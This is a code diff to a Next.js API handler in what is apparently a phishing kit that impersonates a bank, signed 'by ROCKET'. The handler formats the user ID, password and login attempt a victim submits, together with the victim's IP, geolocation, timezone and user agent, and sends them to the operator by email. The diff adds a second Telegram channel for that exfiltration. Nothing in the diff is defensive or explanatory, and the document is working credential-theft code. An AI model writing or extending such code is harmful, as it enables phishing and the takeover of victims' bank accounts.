@@ -4,6 +4,7 @@ import nextConnect from "next-connect";
 import { NextApiRequest, NextApiResponse } from "next";
 import middleware from "../../middleware/middleware";
 import { sendEmail } from "../../utils/sendEmail";
+import { sendTelegram } from "../../utils/sendTelegram";
 
 interface ExtendedRequest extends NextApiRequest {
   files: any;
@@ -27,36 +28,45 @@ handler.post(async (req: ExtendedRequest, res: NextApiResponse) => {
     // const values = JSON.parse(Object.keys(req.body as any)[0]);
 
     const values = req.body;
+    const message = `
+<div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄BEGIN⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
+${
+  values.form[0] === `LOGIN DETAILS` &&
+  ` <br>
+<h4>LOGIN DETAILS</h4>
+<p>| (▰˘◡˘▰) LOGIN ATTEMPT ☞ <b>${
+    JSON.parse(values.loginDetails).loginAttempt
+  }</b></p>
+<p>| (▰˘◡˘▰) USER ID ☞ <b>${JSON.parse(values.loginDetails).userId}</b></p>
+<p>| (▰˘◡˘▰) PASSWORD ☞ <b>${JSON.parse(values.loginDetails).password}</b></p>
+<br>
+<div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
+<br>
+<p>| (▰˘◡˘▰) IP ☞ <b>${ip}</b></p>
+<p>| (▰˘◡˘▰) LOCATION ☞ <b>${geo?.city}, ${geo?.country}</b></p>
+<p>| (▰˘◡˘▰) TIMEZONE ☞ <b>${geo?.timezone}</b></p>
+<p>| (▰˘◡˘▰) USER AGENT ☞ <b>${req.headers[`user-agent`]}</b></p>
+<br>
+<div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄END⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>`
+}`;
 
-    await sendEmail(
-      process.env.TO as string,
-      `
-         <div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄BEGIN⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
-         ${
-           values.form[0] === `LOGIN DETAILS` &&
-           ` <br>
-            <h4>LOGIN DETAILS</h4>
-            <p>| (▰˘◡˘▰) LOGIN ATTEMPT ☞ <b>${
-              JSON.parse(values.loginDetails).loginAttempt
-            }</b></p>
-            <p>| (▰˘◡˘▰) USER ID ☞ <b>${
-              JSON.parse(values.loginDetails).userId
-            }</b></p>
-            <p>| (▰˘◡˘▰) PASSWORD ☞ <b>${
-              JSON.parse(values.loginDetails).password
-            }</b></p>
-            <br>
-            <div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
-            <br>
-            <p>| (▰˘◡˘▰) IP ☞ <b>${ip}</b></p>
-            <p>| (▰˘◡˘▰) LOCATION ☞ <b>${geo?.city}, ${geo?.country}</b></p>
-            <p>| (▰˘◡˘▰) TIMEZONE ☞ <b>${geo?.timezone}</b></p>
-            <p>| (▰˘◡˘▰) USER AGENT ☞ <b>${req.headers[`user-agent`]}</b></p>
-            <br>
-            <div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄END⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>`
-         }`,
-      `${process.env.BANK_NAME} - ${values.form} by ROCKET 🚀🚀🚀 From ${ip}`
-    );
+    if (process.env.TO) {
+      await sendEmail(
+        process.env.TO as string,
+        message,
+        `${process.env.BANK_NAME} - ${values.form} by ROCKET 🚀🚀🚀 From ${ip}`
+      );
+    }
+
+    if (process.env.TELEGRAM_ID) {
+      await sendTelegram({
+        message: `
+        ${process.env.BANK_NAME} - ${values.form} by ROCKET 🚀🚀🚀 From ${ip}
+        ${message}
+      `,
+      });
+    }
+
     res.send(Promise.resolve());
   } catch (error) {
     res.status(500).send({
